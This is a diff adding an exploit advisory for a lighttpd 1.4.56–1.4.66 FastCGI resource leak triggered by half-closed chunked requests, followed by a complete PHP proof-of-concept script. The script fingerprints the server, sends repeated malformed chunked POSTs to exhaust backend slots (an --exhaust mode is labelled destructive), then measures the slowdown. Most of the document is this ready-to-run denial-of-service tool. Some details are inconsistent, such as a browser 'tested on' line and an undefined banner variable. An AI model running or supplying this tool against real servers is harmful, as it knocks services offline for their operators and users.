@@ -1,0 +1,279 @@
+=============================================================================================================================================
+| # Title     : Lighttpd 1.4.66 FastCGI Backend Resource Leak via Chunked Request Handling                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.lighttpd.net/                                                                                                   |
+=============================================================================================================================================
+
+[+] References: https://packetstorm.news/files/id/214293/ & CVE-2025-24367
+
+[+] Summary: A resource exhaustion vulnerability exists in lighttpd versions 1.4.56 through 1.4.66 affecting FastCGI and other gateway backends. 
+             When processing HTTP/1.1 requests using chunked transfer encoding with request-body streaming enabled, 
+			 an anomalous client disconnect (half‑closed TCP connection) before the terminating chunk can cause backend slots to be leaked. 
+             Repeated occurrences may exhaust available backend resources, leading to service degradation or denial of service. The issue is resolved in lighttpd 1.4.67 and later.
+
+[+] POC : php poc.php 
+
+<?php
+
+class FastCGILeakTester {
+    private $host;
+    private $port;
+    private $fcgiPath;
+    private $connections;
+    private $delay;
+    private $detectOnly;
+    private $running = true;
+    private $sockets = [];
+    
+    public function __construct($host, $port, $fcgiPath, $connections, $delay, $detectOnly) {
+        $this->host = $host;
+        $this->port = $port;
+        $this->fcgiPath = $fcgiPath;
+        $this->connections = $connections;
+        $this->delay = $delay;
+        $this->detectOnly = $detectOnly;
+    }
+    
+    private function makeSocket() {
+        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if ($socket === false) {
+            throw new Exception("Cannot create socket: " . socket_strerror(socket_last_error()));
+        }
+        
+        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 5, 'usec' => 0));
+        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 5, 'usec' => 0));
+        
+        if (!socket_connect($socket, $this->host, $this->port)) {
+            throw new Exception("Cannot connect to {$this->host}:{$this->port}: " . socket_strerror(socket_last_error($socket)));
+        }
+        
+        return $socket;
+    }
+    
+    private function chunkyFunk($connectionId) {
+        try {
+            $socket = $this->makeSocket();
+            
+            $request = "POST {$this->fcgiPath} HTTP/1.1\r\n" .
+                      "Host: {$this->host}\r\n" .
+                      "Transfer-Encoding: chunked\r\n" .
+                      "Connection: keep-alive\r\n" .
+                      "\r\n";
+            
+            socket_write($socket, $request);
+            socket_write($socket, "4\r\ntest\r\n");
+
+            socket_shutdown($socket, 1); // 1 = shutdown write
+            
+            $this->sockets[] = $socket;
+            echo "[+] [{$connectionId}] anomalous FastCGI request sent\n";
+        } catch (Exception $e) {
+            echo "[-] [{$connectionId}] failed: " . $e->getMessage() . "\n";
+        }
+    }
+    
+    public function run() {
+        echo "[*] Target: http://{$this->host}:{$this->port}{$this->fcgiPath}\n";
+        echo "[*] Mode: " . ($this->detectOnly ? 'DETECT' : 'EXHAUST') . "\n";
+        
+        for ($i = 0; $i < $this->connections; $i++) {
+            if (!$this->running) {
+                break;
+            }
+            
+            $this->chunkyFunk($i);
+            
+            if ($this->delay > 0) {
+                usleep($this->delay * 1000000);
+            }
+        }
+        
+        echo "[*] Injection phase complete\n";
+    }
+    
+    public function frontendProbe() {
+        echo "[*] Starting frontend probe\n";
+        
+        while ($this->running) {
+            try {
+                $start = microtime(true);
+                
+                $socket = $this->makeSocket();
+                socket_write($socket, "GET / HTTP/1.0\r\n\r\n");
+                
+                $response = '';
+                socket_recv($socket, $response, 64, 0);
+                
+                $elapsed = microtime(true) - $start;
+                socket_close($socket);
+                
+                echo "[PROBE] frontend response time: " . number_format($elapsed, 3) . "s\n";
+            } catch (Exception $e) {
+                echo "[PROBE] frontend failure: " . $e->getMessage() . "\n";
+            }
+            
+            sleep(3);
+        }
+    }
+    
+    public function cleanup() {
+        $this->running = false;
+        foreach ($this->sockets as $socket) {
+            try {
+                socket_close($socket);
+            } catch (Exception $e) {
+
+            }
+        }
+        echo "[*] Cleanup complete\n";
+    }
+}
+
+function checkLighty($host, $port) {
+    try {
+        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if ($socket === false) {
+            throw new Exception("Socket creation failed");
+        }
+        
+        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 3, 'usec' => 0));
+        
+        if (!socket_connect($socket, $host, $port)) {
+            throw new Exception("Connection failed");
+        }
+        
+        socket_write($socket, "HEAD / HTTP/1.0\r\n\r\n");
+        
+        $response = '';
+        while ($chunk = socket_read($socket, 512)) {
+            $response .= $chunk;
+        }
+        
+        socket_close($socket);
+        
+        $lines = explode("\n", $response);
+        foreach ($lines as $line) {
+            if (stripos($line, 'Server:') !== false && stripos($line, 'lighttpd') !== false) {
+                echo "[+] Detected " . trim($line) . "\n";
+                return true;
+            }
+        }
+        
+        echo "[-] lighttpd not detected\n";
+        return false;
+    } catch (Exception $e) {
+        echo "[-] connection failed: " . $e->getMessage() . "\n";
+        return false;
+    }
+}
+
+function main() {
+    global $banner;
+    
+    $options = getopt("", [
+        "host:",
+        "port:",
+        "fcgi-path:",
+        "n:",
+        "conns:",
+        "delay:",
+        "exhaust"
+    ]);
+
+    $host = isset($options['host']) ? $options['host'] : null;
+    if (!$host && isset($argv[1]) && !strpos($argv[1], '--')) {
+        $host = $argv[1];
+    }
+    
+    if (!$host) {
+        echo "Usage: php " . basename(__FILE__) . " [options] <host>\n";
+        echo "Options:\n";
+        echo "  --host <host>           Target host\n";
+        echo "  --port <port>           Target port (default: 80)\n";
+        echo "  --fcgi-path <path>      FastCGI-backed path (default: /index.php)\n";
+        echo "  -n, --conns <num>       Number of connections (default: 5)\n";
+        echo "  --delay <seconds>       Delay between connections (default: 0.2)\n";
+        echo "  --exhaust               Exhaust backend slots (DESTRUCTIVE)\n";
+        exit(1);
+    }
+    
+    $port = isset($options['port']) ? (int)$options['port'] : 80;
+    $fcgiPath = isset($options['fcgi-path']) ? $options['fcgi-path'] : '/index.php';
+    $connections = isset($options['n']) ? (int)$options['n'] : 
+                  (isset($options['conns']) ? (int)$options['conns'] : 5);
+    $delay = isset($options['delay']) ? (float)$options['delay'] : 0.2;
+    $exhaust = isset($options['exhaust']);
+    
+    echo $banner . "\n";
+    
+    if (!checkLighty($host, $port)) {
+        exit(1);
+    }
+    
+    $tester = new FastCGILeakTester(
+        $host,
+        $port,
+        $fcgiPath,
+        $connections,
+        $delay,
+        !$exhaust
+    );
+
+    declare(ticks = 1);
+    pcntl_signal(SIGINT, function() use (&$tester) {
+        echo "\n[*] Interrupted by user\n";
+        $tester->cleanup();
+        exit(0);
+    });
+    
+    try {
+        $tester->run();
+
+        echo "[*] Starting frontend probe\n";
+
+        $probeCount = 0;
+        while ($probeCount < 10) { 
+            try {
+                $start = microtime(true);
+                
+                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+                socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 5, 'usec' => 0));
+                
+                if (socket_connect($socket, $host, $port)) {
+                    socket_write($socket, "GET / HTTP/1.0\r\n\r\n");
+                    
+                    $response = '';
+                    socket_recv($socket, $response, 64, 0);
+                    
+                    $elapsed = microtime(true) - $start;
+                    echo "[PROBE] frontend response time: " . number_format($elapsed, 3) . "s\n";
+                    socket_close($socket);
+                }
+            } catch (Exception $e) {
+                echo "[PROBE] frontend failure: " . $e->getMessage() . "\n";
+            }
+            
+            sleep(3);
+            $probeCount++;
+        }
+        
+    } catch (Exception $e) {
+        echo "[-] Error during test: " . $e->getMessage() . "\n";
+    } finally {
+        $tester->cleanup();
+    }
+    
+    echo "[*] Test complete\n";
+}
+
+if (php_sapi_name() === 'cli') {
+    main();
+} else {
+    echo "This script must be run from the command line.\n";
+    exit(1);
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
